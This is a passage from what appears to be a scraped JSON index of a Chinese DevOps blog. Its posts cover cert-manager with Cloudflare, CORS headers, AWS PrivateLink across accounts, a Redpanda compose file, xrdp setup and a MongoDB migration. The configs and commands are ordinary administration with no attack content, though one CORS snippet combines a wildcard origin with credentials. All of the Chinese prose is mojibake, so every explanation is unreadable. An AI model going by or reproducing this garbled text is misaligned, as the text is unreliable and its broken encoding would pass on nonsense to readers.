13apiVersion: cert-manager.io/v1 14kind: ClusterIssuer 15metadata: 16 name: letsencrypt-prod 17spec: 18 acme: 19 server: https://acme-v02.api.letsencrypt.org/directory 20 email: zhangranrui@gmail.com 21 privateKeySecretRef: 22 name: letsencrypt-prod 23 solvers: 24 - dns01: 25 cloudflare: 26 email: zhangranrui@gmail.com 27 apiTokenSecretRef: 28 name: cloudflare-api-token-secret 29 key: api-token å››ã€å‡†å¤‡podå’Œingress\n1# nginx deployment 2--- 3apiVersion: apps/v1 4kind: Deployment 5metadata: 6 name: nginx 7 labels: 8 app: nginx 9spec: 10 replicas: 1 11 selector: 12 matchLabels: 13 app: nginx 14 template: 15 metadata: 16 labels: 17 app: nginx 18 spec: 19 containers: 20 - name: nginx 21 image: nginx:latest 22 ports: 23 - containerPort: 80 24--- 25# nginx Service 26apiVersion: v1 27kind: Service 28metadata: 29 name: nginx 30spec: 31 selector: 32 app: nginx 33 ports: 34 - protocol: TCP 35 port: 80 36 targetPort: 80 37 type: ClusterIP ç„¶åæˆ‘ä»¬ç›´æ¥å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ä¼šè‡ªåŠ¨ç­¾å‘è¯ä¹¦äº†\n1--- 2apiVersion: networking.k8s.io/v1 3kind: Ingress 4metadata: 5 name: test-ingress 6 annotations: 7 cert-manager.io/cluster-issuer: \u0026#34;letsencrypt-prod\u0026#34; 8spec: 9 tls: 10 - hosts: 11 - test.abc.com 12 secretName: test-tls 13 rules: 14 - host: test.abc.com 15 http: 16 paths: 17 - path: / 18 pathType: Prefix 19 backend: 20 service: 21 name: nginx 22 port: 23 number: 80 å››ã€ä¸€äº›è°ƒè¯•å‘½ä»¤ï¼š\n1$ kubectl get issuer 2$ kubectl get clusterissuer 3$ kubectl get challenges 4$ kubectl describe challenge 5$ kubectl describe certificaterequest 6$ kubectl describe order äº”ã€ç›´æ¥ç”³è¯·è¯ä¹¦\nä¸Šé¢è®²äº†é€šè¿‡ingressæ¥è‡ªåŠ¨ç”³è¯·è¯ä¹¦ï¼Œé‚£æˆ‘ä»¬å¦‚æœä¸é€šè¿‡ingressï¼Œç›´æ¥ç”³è¯·è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ\nä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥æ¥ä¸ªç”³è¯·å³å¯\n1--- 2apiVersion: cert-manager.io/v1 3kind: Certificate 4metadata: 5 name: tls-normal 6 namespace: default 7spec: 8 secretName: tls-normal 9 commonName: abc.cde.com 10 dnsNames: 11 - abc.cde.com 12 issuerRef: 13 name: letsencrypt-prod 14 kind: ClusterIssuer ","date":"2025-07-09","img":"","permalink":"https://rendoumi.com/posts/20250709-cert_manager_cloudflare/","series":null,"tags":null,"title":"å†…ç½‘kubernetes+cloudflare+cert-Managerè‡ªåŠ¨ç­¾å‘è¯ä¹¦"},{"categories":null,"content":"Cross-Origin Resource Sharing (CORS) è·¨åŸŸï¼Œä¸€ä¸ªç½‘ç«™å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªç½‘ç«™çš„èµ„æºï¼Œå°±éœ€è¦è·¨åŸŸäº†ã€‚\næœ€é€šä¿—ç‚¹ï¼Œå°±æ˜¯æœåŠ¡å™¨çš„è¿”å›å¤´ä¸Šè¦åŠ ä¸Šä¸‰è¡Œï¼š\n1Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34; 2Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, POST, OPTIONS\u0026#34; 3Access-Control-Allow-Headers\u0026#34;, \u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; è¯´ç™½ç‚¹ï¼šå°±æ˜¯å…è®¸çš„æ¥æºç«™ï¼Œå…è®¸çš„æ–¹æ³•ï¼Œå…è®¸çš„å¤´ä¿¡æ¯\né‚£åœ¨ä¸åŒçš„åœ°æ–¹é…ç½®åˆä¸ç›¸åŒï¼š\nä¸€ã€Nginx 1 server { 2 add_header Access-Control-Allow-Origin *; 3 add_header Access-Control-Allow-Methods \u0026#39;GET, POST, OPTIONS\u0026#39;; 4 add_header Access-Control-Allow-Headers \u0026#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#39;; äºŒã€openrestyä¸­çš„luaè„šæœ¬ 1location /pg/nginit { 2 rewrite_by_lua_block { 3 ngx.log(ngx.ERR, \u0026#34;Environment configuration update, about to get configuration information from redis\u0026#34;) 4 5 -- æ·»åŠ è·¨åŸŸ CORS å¤´ 6 ngx.header[\u0026#34;Access-Control-Allow-Origin\u0026#34;] = \u0026#34;*\u0026#34; -- å…è®¸æ‰€æœ‰åŸŸåè¯·æ±‚ 7 ngx.header[\u0026#34;Access-Control-Allow-Methods\u0026#34;] = \u0026#34;GET, POST, OPTIONS\u0026#34; -- å…è®¸çš„æ–¹æ³• 8 ngx.header[\u0026#34;Access-Control-Allow-Headers\u0026#34;] = \u0026#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization\u0026#34; -- å…è®¸çš„è¯·æ±‚å¤´ ä¸‰ã€AWSçš„S3 1\u0026lt;CORSConfiguration\u0026gt; 2 \u0026lt;CORSRule\u0026gt; 3 \u0026lt;AllowedOrigin\u0026gt;http://example.com\u0026lt;/AllowedOrigin\u0026gt; 4 \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt; 5 \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt; 6 \u0026lt;/CORSRule\u0026gt; 7\u0026lt;/CORSConfiguration\u0026gt; å››ã€AWS Lambda æˆ–è€… API Gateway 1headers: { 2 \u0026#39;Access-Control-Allow-Origin\u0026#39;: \u0026#39;*\u0026#39;, 3 \u0026#39;Access-Control-Allow-Credentials\u0026#39;: true, 4} æœ€åï¼ŒAWSçš„ALBä¸æ”¯æŒé…ç½®CORSï¼ï¼ï¼ï¼Œå¿…é¡»åœ¨åç«¯çš„ application ä¸­è®¾ç½®ã€‚\n","date":"2025-06-17","img":"","permalink":"https://rendoumi.com/posts/20250617-cors/","series":null,"tags":null,"title":"CORSè·¨åŸŸåœ¨ä¸åŒç¯å¢ƒä¸­çš„é…ç½®"},{"categories":null,"content":"å…¬å¸æœ‰ä¸¤ä¸ªAWSè´¦å·ï¼Œæœ‰å„è‡ªä¸åŒçš„ VPC åŸŸã€‚å…¶ä¸­ä¸€ä¸ªè´¦å·ç”¨åˆ°äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\nç°åœ¨å¦ä¸€ä¸ªè´¦å·ä¹Ÿéœ€è¦ç”¨åˆ°posgresæ•°æ®åº“ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•æ˜¯åœ¨æœ¬åŸŸå†æ­ä¸€å¥—postgresï¼Œæˆ–è€…ec2æ–°åŠ ä¸€å°ï¼Œä¸Šé¢å®‰è£…posgresã€‚\nå…ˆå»æ£€æŸ¥äº†ä¸€ä¸‹å·²æœ‰çš„postgres serverlessæœåŠ¡ï¼Œç»“æœä½¿ç”¨ç‡æ‰23%ï¼Œå½“ä¸‹å°±ç›´æ¥æƒ³å¤ç”¨å®ƒäº†ã€‚\né‚£èƒ½ä¸èƒ½å•ç‹¬å†å¼€ä¸€ä¸ªdbï¼Œå•ç‹¬ç»™ç¬¬äºŒä¸ªè´¦å·ç”¨å‘¢ï¼ŒæŸ¥äº†åŠå¤©èµ„æ–™ã€‚å¯ä»¥çš„ï¼Œä½†æ˜¯å§ï¼ŒchatgptçœŸçš„æ˜¯æ»¡å˜´èƒ¡è¯´å…«é“ï¼Œè¿å¸¦geminiä¹Ÿæ˜¯ã€‚\nawså®¶çš„ä¸œè¥¿éƒ½æ˜¯å¼€æºç»è¿‡é­”æ”¹ï¼Œè·Ÿç½‘ä¸Šå å¤§å¤šæ•°çš„èµ„æ–™æ˜¯ä¸åŒçš„ï¼Œè¿™ç›´æ¥å¯¼è‡´ chatgpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\nè¿˜æœ‰å°±æ˜¯awså®¶çš„ä¸œè¥¿æ›´æ–°ä¿®æ”¹å¾ˆå¿«ï¼Œæœ€æ–°çš„æ–‡æ¡£å’Œä¹‹å‰çš„æ–‡æ¡£ä¸åŒï¼Œä¹Ÿå¯¼è‡´ chatpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°çš„æ—§æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\nè¿™ä¸ªä¸œè¥¿çš„æ¶æ„å›¾å¦‚ä¸Šï¼Œå³è¾¹çš„VPCé‡Œé¢è¿ç€ aurora æœåŠ¡ï¼Œå®ƒå®é™…æ˜¯target groupçš„ä¸€ä¸ªç›®æ ‡ï¼Œç„¶åä¸Šè”åˆ°nlbï¼Œnlbå†ä¸Šè”åˆ°endpoint serviceï¼Œå¯¹å¤–æä¾›æœåŠ¡.\nç„¶åå·¦é¢VPCä¸­å»ºendpointï¼Œé€šè¿‡PrivateLinkè¿æ¥åˆ°å³è¾¹çš„EndpointServiceï¼Œè¿™æ ·é€šè¿‡ç§æœ‰çš„dns nameå’Œsecurity groupå†è¿›è¡Œæ§åˆ¶ï¼Œå°±å¯ä»¥ç›´æ¥è¿åˆ°å³è¾¹çš„endpoint serviceæœåŠ¡èµ„æºäº†ã€‚\nå…·ä½“çš„åšæ³•æ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ç¬¬ä¸€æ­¥ï¼Œå³è¾¹çš„VPCä¸­ 1ã€å»ºç«‹EndpointService\nåˆ°VPCä¸­ï¼Œå·¦è¾¹çš„Endpoint Servicesï¼Œç‚¹å‡»ï¼š\nç‚¹å‡»Create endpoint serviceæ–°å»ºä¸€ä¸ª\nåå­—ï¼špostgresql-serverless-endpoint-serviceï¼Œç”±äºç°åœ¨è¿˜æ²¡æœ‰nlbï¼Œéœ€è¦å†æ–°å»ºä¸€ä¸ªï¼›ç‚¹å‡»Create new load balancer\n2ã€å»ºç«‹nlb\nç‚¹å‡»ï¼šCreate load balanceræ–°å»º\nè¿™ä¸ªç±»å‹ï¼Œåªèƒ½æ˜¯nlb\næˆ‘ä»¬è¿™ä¸ªnlbï¼Œä¸æ”¾åœ¨å…¬ç½‘ï¼Œä¸å…¬å¼€ï¼Œæ‰€ä»¥é€‰ç§æœ‰çš„Internalï¼Œåªæœ‰IPV4ï¼Œä¸æä¾›IPV6.\nç½‘ç»œé€‰è¯¥VPCï¼Œå­ç½‘é€‰æ‹©ä¸‰ä¸ªprivateçš„å­ç½‘\nSecurity groupsé€‰æ‹©ä¸€ä¸‹ï¼Œè¿™é‡Œrds-sgçš„inboundè§„åˆ™æ˜¯å…è®¸TCPç«¯å£5432çš„è¿›å…¥ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªSG\nåˆ°æœ€åäº†ï¼Œå±…ç„¶è¿˜æ²¡æœ‰target groupï¼Œé‚£åˆè¦å»ºä¸€ä¸ªäº†ï¼Œç‚¹å‡»Create target groupå»ºç«‹\n3ã€å»ºç«‹target group\nåå­—å«åšï¼špostgres-target-group\næˆ‘ä»¬é€‰IP addressesï¼Œå› ä¸ºè¦è¿åˆ°åé¢çš„postgresæœåŠ¡\nç„¶åé€‰å¥½TCPï¼ŒPort 5432ï¼Œ IPV4ï¼ŒVPCï¼Œå…¶å®ƒä¿æŒç¼ºçœï¼Œç„¶åå»ºç«‹\n4ã€æ³¨å†Œtarget group\ntarget groupå»ºç«‹å¥½ä»¥åï¼Œæˆ‘ä»¬è¦æŠŠPostgresçš„æœåŠ¡IPç»™æ³¨å†Œä¸Šå»\nç‚¹å‡»Register targetsæ–°å»º\næˆ‘ä»¬æŠŠposgres serverlessæœåŠ¡è§£æå‡ºæ¥çš„IPåœ°å€å¤©ä¸Šå»ï¼Œç«¯å£ä¹Ÿå¡«ä¸Š5432ï¼Œç„¶åæ³¨å†Œä¸Šå»å³å¯ã€‚\næ³¨å†Œå¥½äº†ä»¥åä¼šçœ‹åˆ°çŠ¶æ€healthyæ˜¯ç»¿è‰²çš„ã€‚è¿™æ ·å°±okäº†\n4ã€å®Œæˆnlb\ntarget groupå¥½äº†ä»¥åï¼Œæˆ‘ä»¬è¿”å›nlbï¼Œå…¶ä½™ä¿æŒåˆå§‹å€¼ï¼Œå®Œæˆåˆ›å»º\n5ã€å®Œæˆendpoint service\nnlbå¥½äº†ä»¥åï¼Œæˆ‘ä»¬è¿”å›endpoint serviceï¼Œåˆ·æ–°nlbï¼Œç„¶åé€‰ä¸­æ–°å»ºçš„nlbï¼Œç„¶åä¸‹é¢ä¸é€‰Supported Regionsï¼Œå› ä¸ºè¿™ä¸ªè·¨å¤šä¸ªregionçš„ï¼Œæˆ‘ä»¬ä¸¤ä¸ªvpcéƒ½åœ¨åŒä¸€åŒºåŸŸã€‚\né€‰ä¸­Acceptance requiredï¼Œæ„æ€æ˜¯éœ€è¦æ‰¹å‡†endpointçš„è¿å…¥è¯·æ±‚ï¼Œå†é€‰ä¸­æ”¯æŒIPV4ï¼Œç„¶åç‚¹å‡»åˆ›å»º\n5ã€èµ‹äºˆendpoint serviceè®¿é—®æƒé™\nå»ºå¥½åï¼Œæˆ‘ä»¬å»æŸ¥çœ‹è¿™ä¸ªEndpoint serviceæœåŠ¡\nå…ˆç‚¹å‡»ï¼ŒAllow principals çš„ tab é¡µï¼Œç„¶åç‚¹å‡»Allow principalsæ–°å»º\næ·»åŠ å¦ä¸€ä¸ªvpcçš„è´¦å·ï¼šarn:aws:iam::01234567981011:root\næ³¨æ„ä¸­é—´iamåé¢çš„ä¸€ä¸²æ•°å­—ï¼Œå°±æ˜¯å¦ä¸€ä¸ªè´¦å·ç™»å½•åçš„accound idï¼Œä¹Ÿå°±æ˜¯AWS_PROFILEä¸­å€¼ä¸­çš„é‚£ä¸²æ•°å­—\nè¿™æ ·å¦ä¸€ä¸ªvpcåŸŸçš„æ‰€æœ‰èµ„æºéƒ½å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªendpoint serviceäº†\nä¹‹åè¿˜è¦åœ¨Endpoint connections çš„ tab é¡µä¸­æ‰¹å‡†æ–°è¿æ¥ã€‚\nåŒæ—¶æŠŠService nameç»™æ‹·è´ä¸‹æ¥ï¼šcom.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\näºŒã€å·¦è¾¹çš„VPCä¸­ 1ã€å»ºç«‹Endpoint\nå»åˆ°VPCï¼Œå»ºendpointï¼Œç‚¹å‡»Create ednpointæ–°å»º\nåå­—ï¼šmy-endpoint-postgresï¼Œé€‰æ‹©ç±»å‹æ˜¯Endpoint services that use NLBs and GWLBs\nç„¶åService settingsè¾“å…¥å³è¾¹VPC ä¸Š endpoint service æ‹·è´çš„service nameï¼Œè¿›è¡ŒéªŒè¯ï¼šcom.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\nç„¶åå°±å¾—å»ç™»å½•å³è¾¹vpcçš„è´¦å·ï¼Œåœ¨Endpoint connectionsä¸­æ‰¹å‡†è¿™ä¸ªæ–°è¿æ¥ã€‚\nç„¶åå†è¿”å›æ¥ï¼Œé€‰VPCï¼Œé€‰å­ç½‘ï¼Œé€‰SGã€‚è¿™é‡Œæˆ‘ä»¬åŒæ ·é€‰ç§ç½‘çš„ä¸‰ä¸ªå­ç½‘ã€‚SGåŒæ ·æ˜¯inboundæ˜¯TCP æ”¾è¡Œ5432ç«¯å£ï¼Œæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª\nè¿™æ ·endpointå°±å»ºå¥½äº†ã€‚æŸ¥çœ‹å®ƒdetailçš„tabé¡µï¼Œæ‹·è´ä¸‹æ¥DNS names\n2ã€æµ‹è¯•\næˆ‘ä»¬åœ¨å·¦è¾¹VPCçš„æœºå™¨é‡Œèµ·ä¸ªshellï¼Œç”¨dns nameè¿æ¥5432ç«¯å£ï¼Œæµ‹é€šå³å¯\n1telnet vpce-xxxx.vpce-svc-xxxx.ap-southeast-1.vpce.amazonaws.com 5432 ","date":"2025-05-21","img":"","permalink":"https://rendoumi.com/posts/20250521-aws_endpoint/","series":null,"tags":null,"title":"AWSçš„è·¨è´¦å·è®¿é—®ä¸åŒVPCåŸŸä¸­çš„æœåŠ¡"},{"categories":null,"content":"å…¬å¸çš„ä¸€ä¸ªå…¬ç½‘è¦æ¬åˆ°å†…ç½‘çš„ä¸€ä¸ªRancheré›†ç¾¤ä¸Šï¼Œå¾ˆç¹ç\nåŸæœ‰çš„æ¶æ„æœ‰kafkaï¼Œè¦åœ¨å†…ç½‘å¤ç°ä¸€ä¸ªå‡ºæ¥\né‚£3èŠ‚ç‚¹çš„kafkaå’Œ3èŠ‚ç‚¹çš„zookeeperï¼ŒçœŸçš„æ˜¯ä¸æƒ³æ­å•Š\næœå•Šæœå•Šæœå•Šæœï¼Œç»ˆäºæ‰¾åˆ°è‹¥å¹²å¹³æ›¿ï¼š\n1Redis çš„å¹³æ›¿ Dragonfly 2Mongo çš„å¹³æ›¿ FerretDB 3Kafka çš„å¹³æ›¿ Redpanda é‚£å°±é€‰å®šç”¨Redpandaæ¥æï¼Œæ–¹æ³•è¿˜æ˜¯æœ‰ä¸€äº›æ›²æŠ˜çš„ï¼š\nRedpanda åœ¨ 2025å¹´5æœˆ16æ—¥è¿™ä¸ªèŠ‚ç‚¹ï¼Œæœ‰5ä¸ªç‰ˆæœ¬\næœ€æ–°çš„25.1çš„ç‰ˆæœ¬ï¼Œå¦‚æœç”¨docker composeæ¥å¯åŠ¨ï¼Œæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå¥½å¤šæ–‡ä»¶ã€‚\næ•°æ®ç›˜æœ‰ä¸‰ä¸ªäº†ï¼Œè€Œä¸”ç”¨åˆ°äº†minioåšåç«¯çš„æŒä¹…åŒ–å·ï¼Œè¿™ä¹ˆå¤æ‚ï¼Œé‚£ä¸å¦‚ç›´æ¥æKafkaäº†\né‚£åªèƒ½å¾€å‰å›é€€ï¼Œé€‰ç”¨24.2çš„ç‰ˆæœ¬ï¼Œdocker compose å°±ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªç‰ˆæœ¬ 2025å¹´7æœˆ31æ—¥å°±ç»ˆç»“æ”¯æŒäº†ã€‚\nä¸‹è½½çš„è¯ï¼šhttps://docs.redpanda.com/24.2/get-started/quick-start/\næˆ‘ä»¬è¦çš„æ˜¯ä¸€ä¸ªbrokerçš„ï¼Œé‚£ç›´æ¥ç»™å‡ºæºæ–‡ä»¶\n1name: redpanda-quickstart-one-broker 2networks: 3 redpanda_network: 4 driver: bridge 5volumes: 6 redpanda-0: null 7services: 8 redpanda-0: 9 command: 10 - redpanda 11 - start 12 - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092 13 # Address the broker advertises to clients that connect to the Kafka API. 14 # Use the internal addresses to connect to the Redpanda brokers\u0026#39; 15 # from inside the same Docker network. 16 # Use the external addresses to connect to the Redpanda brokers\u0026#39; 17 # from outside the Docker network. 18 - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092 19 - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082 20 # Address the broker advertises to clients that connect to the HTTP Proxy. 21 - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082 22 - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081 23 # Redpanda brokers use the RPC API to communicate with each other internally. 24 - --rpc-addr redpanda-0:33145 25 - --advertise-rpc-addr redpanda-0:33145 26 # Mode dev-container uses well-known configuration properties for development in containers. 27 - --mode dev-container 28 # Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system. 29 - --smp 1 30 - --default-log-level=info 31 image: docker.redpanda.com/redpandadata/redpanda:v25.1.4 32 container_name: redpanda-0 33 volumes: 34 - redpanda-0:/var/lib/redpanda/data 35 networks: 36 - redpanda_network 37 ports: 38 - 18081:18081 39 - 18082:18082 40 - 19092:19092 41 - 19644:9644 42 console: 43 container_name: redpanda-console 44 image: docker.redpanda.com/redpandadata/console:v3.1.0 45 networks: 46 - redpanda_network 47 entrypoint: /bin/sh 48 command: -c \u0026#39;echo \u0026#34;$$CONSOLE_CONFIG_FILE\u0026#34; \u0026gt; /tmp/config.yml; /app/console\u0026#39; 49 environment: 50 CONFIG_FILEPATH: /tmp/config.yml 51 CONSOLE_CONFIG_FILE: | 52 kafka: 53 brokers: [\u0026#34;redpanda-0:9092\u0026#34;] 54 schemaRegistry: 55 enabled: true 56 urls: [\u0026#34;http://redpanda-0:8081\u0026#34;] 57 redpanda: 58 adminApi: 59 enabled: true 60 urls: [\u0026#34;http://redpanda-0:9644\u0026#34;] 61 ports: 62 - 8080:8080 63 depends_on: 64 - redpanda-0 ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œè¿™é‡Œé¢æœ‰é—®é¢˜ï¼Œå·æ˜¯ç©ºçš„ï¼Œè¿™å¯ä¸è¡Œï¼Œå¿…é¡»æŒä¹…åŒ–åˆ°æœ¬åœ°ï¼Œæ”¹ä¸€ä¸‹\n1volumes: 2 redpanda-0: 3 driver: local 4 driver_opts: 5 type: none 6 device: /data/redpanda/data 7 o: bind ç„¶åç›´æ¥å¯åŠ¨ï¼š\n1docker compose up -d å…¶å®æ˜¯å¯åŠ¨äº†ä¸¤ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªæ•°æ®ç«¯ï¼›ä¸€ä¸ªæ˜¯consoleï¼Œå®¢æˆ·ç«¯\næˆ‘ä»¬æ‰“å¼€8080 webçš„ç«¯å£ï¼Œé‚£å®¢æˆ·ç«¯å‘¢ï¼Œè¿çš„å°±æ˜¯19092ç«¯å£ï¼Œç”¨æ³•è·Ÿkafkaå®Œå…¨ä¸€æ ·ã€‚\n","date":"2025-05-16","img":"","permalink":"https://rendoumi.com/posts/20250516-redpanda/","series":null,"tags":null,"title":"Kafkaçš„æµ‹è¯•æ›¿ä»£å“-Redpanda"},{"categories":null,"content":"éå¸¸éƒé—·çš„ä¸€ä»¶äº‹ã€‚å…¬å¸çš„ç½‘ç»œæ¶æ„éå¸¸æœ‰æ„æ€ï¼Œçµæ´»æ€§æå¤§ã€‚å¯¼è‡´æˆ‘è¿™ä¸ªæ€»åœ¨å…¬å¸ä¹‹å¤–ç”¨openvpnè¿è¿›å»çš„äººå¾ˆç—›è‹¦ï¼Œæ— æ³•å¤ç°åŒäº‹æå‡ºçš„é—®é¢˜ã€‚\næ²¡åŠæ³•ï¼Œéœ€è¦åœ¨å…¬å¸ç½‘ç»œå†…éƒ¨æœ‰å°æµ‹è¯•æœºï¼Œé‚£å®é™…æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œä½†éƒ½æ˜¯debianæˆ–è€…ubuntuçš„ï¼Œè€Œé—®é¢˜ååæ˜¯ç½‘é¡µæ‰“ä¸å¼€çš„é—®é¢˜ã€‚\né‚£å°±å¹²è„†æ‰¾ä¸€å°Ubuntuï¼Œå®‰è£…ä¸€ä¸‹è¿œç¨‹æ¡Œé¢ï¼Œç”¨RDP 3389è¿è¿›å»ï¼Œå¯åŠ¨ä¸€ä¸ªFirefoxï¼Œè¿›è¡Œæµ‹è¯•å³å¯ã€‚\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å‡çº§ubuntuåˆ°æœ€æ–°\n1sudo apt update 2sudo apt upgrade -y äºŒã€å®‰è£…xrdp\n1sudo apt install xrdp -y ä¸‰ã€å®‰è£…æ¡Œé¢ç¯å¢ƒxfce\n1sudo apt install xfce4 xfce4-goodies -y å››ã€é…ç½®xfceä½¿ç”¨xrdp\n1echo xfce4-session \u0026gt; ~/.xsession 2 3# å°†æœ€åä¸€è¡Œæ›¿æ¢æ‰ 4sudo vi /etc/xrdp/startwm.sh 5#exec /bin/sh /etc/X11/Xsession 6exec startxfce4 äº”ã€è®¾ç½®xrdpæœåŠ¡è‡ªå¯åŠ¨\n1sudo systemctl enable xrdp 2sudo systemctl start xrdp å…­ã€å¦‚æœæœ‰é˜²ç«å¢™ï¼Œè®°å¾—æ”¾å¼€3389çš„tcpç«¯å£\nä¸ƒã€æŠŠç”¨æˆ·åŠ å…¥ssl-certç»„\n1# è¿™é‡Œæˆ‘çš„ç™»å½•ç”¨æˆ·æ˜¯debian 2sudo adduser debian ssl-cert 3 4# åŠ ç»„ä¸ç”¨é‡å¯ï¼Œå¦‚æœ‰å…¶å®ƒæ”¹åŠ¨éœ€è¦é‡å¯ 5sudo systemctl restart xrdp å…«ã€å®‰è£…Firefox\n1sudo apt install firefox-esr ä¹ã€å¼€è¿œç¨‹æ¡Œé¢ï¼Œè¿ä¸Šå»ï¼Œå¼€ä¸ªå‘½ä»¤è¡Œæ‰§è¡Œfirefox-esr\n","date":"2025-05-16","img":"","permalink":"https://rendoumi.com/posts/20250516-ubuntu_rdp/","series":null,"tags":null,"title":"Ubuntu å¦‚ä½•å®‰è£…è¿œç¨‹æ¡Œé¢RDP"},{"categories":null,"content":"è¦åšä¸€ä¸ªmongodbé›†ç¾¤çš„è¿ç§»å’Œæ¢å¤ï¼ŒçœŸæ˜¯æŠ˜è…¾æ­»äººäº†ã€‚è®°å½•å¹¶é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼š\nmongodbçš„toolsçœŸçš„æ˜¯å¤ªç®€æ˜“ã€ç²—ç³™ã€ä¸‘é™‹äº†ã€‚\nçº¿ä¸Šçš„æºæ•°æ®åº“æ˜¯è…¾è®¯çš„æœåŠ¡ï¼Œè¦åºŸå¼ƒæ¬è¿åˆ°å†…ç½‘ï¼Œè¶³è¶³æŠ˜è…¾äº†ä¸€ä¸ªæ˜ŸæœŸã€‚\nçº¿ä¸Šæºæ•°æ®åº“ç¯å¢ƒå¦‚ä¸‹ï¼š\näº‘æ•°æ®åº“ TencentDB 4C/8GB/500GB 3èŠ‚ç‚¹ äºæ˜¯åœ¨çº¿ä¸‹å¯¹ç­‰å»ºç«‹äº†mongoé›†ç¾¤ï¼ŒåŒæ ·é…ç½®ï¼ŒåŒæ ·3èŠ‚ç‚¹ã€‚\nå™©æ¢¦ç”±æ­¤å¼€å§‹å•Šï¼Œæ³¨æ„çº¿ä¸‹é›†ç¾¤çš„memoryé…ç½®ä¸€å®šè¦é«˜ï¼š\n32GB ç”¨æˆ·åå’Œå¯†ç ä¸€å®šè¦å’Œçº¿ä¸Šå®Œå…¨ä¸€è‡´ å¦‚æœç”¨æˆ·åå¯†ç ä¸ä¸€è‡´ï¼ŒDocumentæ¢å¤å®Œæ¯•ï¼ŒIndexæ— æ³•å»ºç«‹ï¼Œå› ä¸ºæ˜¯å®Œå…¨æ¢å¤ï¼Œä¼šè¦†ç›–adminè¿™ä¸ªdb ç„¶åå¼€å§‹dumpçº¿ä¸Šæ•°æ®\n1mongodump -vvvvv --uri=\u0026#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026#34; ç„¶åç”Ÿæˆä¸€ä¸ª24Gå¤§å°å¾—dumpæ–‡ä»¶å¤¹ï¼Œå‹ç¼©å2.4Gï¼Œä¼ è¾“åˆ°çº¿ä¸‹åº“ä¸Šå‡†å¤‡æ¢å¤\n1# å¤§é‡æ¢å¤å¿…é¡»æ‰©å¤§æ–‡ä»¶å¥æŸ„ï¼Œå¦åˆ™è¿‡ä¸å» 2ulimit -n 655360 3 4# ä¸€å®šè¦è®°å½•ä¸‹æ¥å¼€å§‹çš„æ—¶é—´æˆ³ï¼Œåé¢æœ‰ç”¨ 5date 6Sun May 11 06:34:02 PM CST 2025 7 8# å¼€å§‹æ¢å¤ï¼Œæ¼«é•¿çš„ä¸€å¤©å¼€å§‹äº† 9# å¿…é¡»æ”¾åˆ°screenä¸­æ‰§è¡Œï¼Œå¦åˆ™ç½‘ç»œä¸å¥½ï¼Œæ–­äº†ä¹Ÿä¼šå¾ˆæ‚²å‰§ 10 11screen -L 12 13./mongorestore \\ 14 --drop \\ 15 --host=192.168.111.222 \\ 16 --port=27017 \\ 17 --username=root \\ 18 --authenticationDatabase=admin \\ 19 --nsExclude=admin \\ 20 /root/dump 21 22 ctrl+a+d å…¶å®åˆšå¼€å§‹çº¿ä¸‹ä¸‰èŠ‚ç‚¹å¾—é…ç½®æ˜¯8Gï¼Œç„¶åæ¢å¤ç”¨äº†ä¸€æ™šï¼ŒæŠ¥é”™ï¼Œç›´æ¥æŠŠshard3ç»™æ‰“å´©äº†ï¼Œè™½ç„¶ä¸‰èŠ‚ç‚¹éƒ½æ˜¯dockerå¯åŠ¨å¾—ï¼Œæœ‰è‡ªåŠ¨æ¢å¤æœºåˆ¶ï¼Œä½†æ˜¯mongorestoreå¯ä¸ç®¡è¿™ä¸ªï¼Œä¸­æ–­æœŸé—´æœ‰1000ä¸ªDocumentæ²¡æœ‰æ¢å¤æˆåŠŸã€‚\né‡è¯•äº†2æ¬¡åæ‰å‘ç°è¿™é—®é¢˜ï¼Œ2å¤©å·²ç»è¿‡å»äº†ï¼Œæ„è¯†åˆ°å°±ç«‹åˆ»æŠŠå†…å­˜æå‡åˆ°32Gï¼Œå†æ¬¡è¿›è¡Œæ¢å¤ã€‚\nä½†æ˜¯æ–°å»ºçš„é›†ç¾¤çš„å¯†ç 